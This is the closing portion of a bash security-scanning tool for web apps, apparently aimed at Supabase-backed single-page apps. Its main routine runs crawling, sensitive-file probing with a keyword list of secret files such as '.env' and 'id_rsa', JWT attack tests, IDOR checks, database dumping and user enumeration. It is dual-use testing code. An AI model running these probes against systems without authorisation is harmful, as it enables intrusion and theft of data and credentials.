        echo -e "  ${RED}${BOLD}⚠  VULNERABILITIES: $VULN_COUNT${NC}"
        for v in "${VULNS[@]}"; do echo -e "  ${RED}     • $v${NC}"; done
    else
        echo -e "  ${LGREEN}${BOLD}✅ No vulnerabilities found${NC}"
    fi
    if [[ ${#MCFGS[@]} -gt 0 ]]; then
        echo ""
        echo -e "  ${YELLOW}${BOLD}⚙  MISCONFIGURATIONS: ${#MCFGS[@]}${NC}"
        for v in "${MCFGS[@]}"; do echo -e "  ${YELLOW}     • $v${NC}"; done
    fi

    echo ""
    echo -e "  ${DIM}report.html       → ${REPORTF}${NC}"
    echo -e "  ${DIM}findings.txt      → ${FINDINGS}${NC}"
    echo -e "  ${DIM}owasp.json        → ${OUT_DIR}/owasp.json${NC}"
    echo -e "  ${DIM}platform.json     → ${PLATFORM_JSON}${NC}"
    echo -e "  ${DIM}endpoints.txt     → ${ENDPOINTS}${NC}"
    echo -e "  ${DIM}db_dump.json      → ${DBDUMP}${NC}"
    echo -e "  ${DIM}crawl.json        → ${CRAWLF}${NC}"
    echo -e "  ${DIM}sensitive_files   → ${SENSF}${NC}"
    echo -e "  ${DIM}curl_commands.sh  → ${CURLF}${NC}"
  echo -e "  ${DIM}validate_findings → ./validate_findings.sh${NC}"
    echo -e "  ${DIM}py helpers        → ${PYDIR}/${NC}"
    echo ""

    # JSON summary
    if $JSON_OUT; then
        python3 - << JSEOF 2>/dev/null || true
import json
from datetime import datetime
summary={
    "scan_time":    datetime.utcnow().isoformat()+"Z",
    "target":       "${APP_URL}",
    "domain":       "${DOMAIN}",
    "profile":      "${PROFILE}",
    "scan_seconds": ${elapsed},
    "vulnerabilities": ${VULN_COUNT},
    "misconfigs":   ${#MCFGS[@]},
    "endpoints":    ${ep_count:-0},
    "tables":       ${#TABLES[@]},
    "crawled":      ${#CRAWLED[@]},
    "sensitive":    ${#SENSFOUND[@]},
    "vuln_list":    [],
    "outputs": {
        "report":    "${REPORTF}",
        "findings":  "${FINDINGS}",
        "owasp":     "${OUT_DIR}/owasp.json",
        "platform":  "${PLATFORM_JSON}",
        "endpoints": "${ENDPOINTS}",
        "db_dump":   "${DBDUMP}",
    }
}
with open("${OUT_DIR}/scan.json","w") as f: json.dump(summary, f, indent=2)
print(f"JSON summary: ${OUT_DIR}/scan.json")
JSEOF
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
main() {
    SCAN_START=$(date +%s)
    banner
    check_deps || exit 1
    parse_args "$@"

    # Export UA so Python helpers use the same realistic user-agent
    export ACADI_UA="$UA"

    # Detect-only fast path
    if $DETECT_ONLY; then
        run_detect_only
        exit 0
    fi

    info "Profile: ${PROFILE} | Timeout: ${TIMEOUT}s | Output: ${OUT_DIR}"
    $FULL               && info "Full scan enabled"
    $QUIET              && info "Quiet mode"
    $ENABLE_INJECTION   && warn "Injection tests ENABLED (--enable-injection)"
    $ENABLE_SSRF        && warn "SSRF tests ENABLED (--enable-ssrf)"
    $AGGRESSIVE         && warn "Aggressive mode — all active tests enabled"
    echo ""

    # ── Phase 1: Asset Discovery ──────────────────────────────────────────
    step "1" "ASSET DISCOVERY & DOWNLOAD"
    write_python_helpers || { err "Failed to write helpers"; exit 1; }
    ok "18 Python helpers written to ${PYDIR}/"

    if $SKIP_DL && [[ $(find "$OUT_DIR" -maxdepth 1 -name "*.js" 2>/dev/null | wc -l) -gt 0 ]]; then
        info "Reusing existing assets in $OUT_DIR"
    else
        local asset_urls=()
        readarray -t asset_urls < <(fetch_assets 2>/dev/null || true)
        if [[ ${#asset_urls[@]} -eq 0 ]]; then
            warn "No JS assets found — URL may be unreachable, behind auth, or not a SPA"
            warn "Continuing with header/crawler/sensitive-file analysis only..."
            NO_PROBE=true
        else
            download_assets "${asset_urls[@]}" 2>/dev/null || warn "Some assets failed to download"
        fi
    fi

    # ── Phase 2: Bundle Analysis ──────────────────────────────────────────
    step "2" "BUNDLE ANALYSIS"
    BUNDLE=$(find_bundle 2>/dev/null || true)
    if [[ -n "$BUNDLE" ]]; then
        local kb; kb=$(( $(stat -c%s "$BUNDLE" 2>/dev/null || echo 0) / 1024 ))
        ok "Bundle: $BUNDLE (${kb} KB)"
        cat "$BUNDLE" | tr -d '\000' > "${OUT_DIR}/bundle.txt" 2>/dev/null || true
        analyse_bundle 2>/dev/null || warn "Bundle analysis partial"
    else
        warn "No JS bundle found — skipping bundle analysis"
        touch "${OUT_DIR}/bundle.txt"
    fi

    # ── Phase 3: Platform Detection + Discovery ───────────────────────────
    step "3" "PLATFORM DETECTION & DISCOVERY"
    detect_platform 2>/dev/null || warn "Platform detection incomplete"

    if [[ "$PROFILE" != "quick" ]]; then
        local max_d=3; $FULL && max_d=5
        local max_u=200; $FULL && max_u=500
        info "Crawling (depth=${max_d}, max=${max_u})..."
        python3 "${PYDIR}/crawl.py" "$APP_URL" "$max_d" "$max_u" "$CRAWLF" 2>/dev/null &
        local cpid=$!
        info "Scanning for sensitive files (${max_u} paths)..."
        python3 "${PYDIR}/filescan.py" "$APP_URL" "$SENSF" 2>/dev/null &
        local fpid=$!
        wait $cpid 2>/dev/null || true
        wait $fpid  2>/dev/null || true
    else
        echo "[]" > "$CRAWLF"
        echo "[]" > "$SENSF"
    fi

    readarray -t CRAWLED   < <(python3 -c "
import json
try:
    d=json.load(open('${CRAWLF}'))
    for r in d: print(r.get('url',''))
except: pass
" 2>/dev/null || true)

    readarray -t SENSFOUND < <(python3 -c "
import json
try:
    d=json.load(open('${SENSF}'))
    for r in (d or []):
        if isinstance(r,dict) and r.get('status')==200: print(r.get('url',''))
except: pass
" 2>/dev/null || true)

    ok "Crawled: ${#CRAWLED[@]} URLs | Sensitive: ${#SENSFOUND[@]} accessible"

    # Flag sensitive file hits
    python3 -c "
import json
try:
    d=json.load(open('${SENSF}'))
    for r in (d or []):
        if not isinstance(r,dict): continue
        if r.get('secrets'): print('SECRET|'+r.get('url','')+'|'+str(r.get('secrets',['?'])[0])[:60])
        elif r.get('status')==200:
            p=r.get('path','')
            if any(x in p for x in ['.env','config','secret','backup','.sql','.key','id_rsa','.git','credential']):
                print('CRITICAL|'+r.get('url',''))
            elif any(x in p for x in ['admin','debug','actuator','phpinfo','graphiql']):
                print('ADMIN|'+r.get('url',''))
except: pass
" 2>/dev/null | while IFS='|' read -r kind url rest; do
        case "$kind" in
            SECRET)   vuln "Secret exposed in file: ${url} — ${rest}"; log "SENSITIVE:SECRET:${url}" ;;
            CRITICAL) vuln "Critical file accessible: ${url}";          log "SENSITIVE:CRIT:${url}" ;;
            ADMIN)    warn  "Admin/debug path accessible: ${url}";       log "SENSITIVE:ADMIN:${url}" ;;
        esac
    done

    discover_swagger  2>/dev/null || warn "Swagger discovery incomplete"
    parse_schema      2>/dev/null || true
    build_endpoint_map 2>/dev/null || true

    # ── Phase 4: Static Analysis ──────────────────────────────────────────
    step "4" "STATIC SECURITY ANALYSIS"
    analyse_jwt 2>/dev/null || warn "JWT analysis failed"

    # ── Phase 5: Active Security Testing ─────────────────────────────────
    if ! $NO_PROBE; then
        step "5" "ACTIVE SECURITY TESTING"
        audit_headers       2>/dev/null || warn "Header audit failed"
        scan_platform_specific 2>/dev/null || warn "Platform scan had errors"

        if [[ -n "${SUPABASE:-}" && "$SUPABASE" != "{SUPABASE_URL}" ]]; then
            sweep_unauth        2>/dev/null || true
            test_idor           2>/dev/null || true
            test_method_override 2>/dev/null || true
            test_jwt_attacks    2>/dev/null || true
            test_storage        2>/dev/null || true
            test_rate_limit     2>/dev/null || true

            # ── Phase 6: Database Intelligence ────────────────────────────
            step "6" "DATABASE & USER INTELLIGENCE"
            query_database  2>/dev/null || warn "DB query incomplete"
            enumerate_users 2>/dev/null || warn "User enum incomplete"
            probe_rpc       2>/dev/null || warn "RPC probe incomplete"
        fi
    else
        info "Active probing skipped (profile=${PROFILE} or --no-probe)"
    fi

    generate_curls            2>/dev/null || warn "curl generation failed"
    generate_validate_script || true
    generate_report           2>/dev/null || warn "Report generation failed"
    final_summary
}

main "$@"
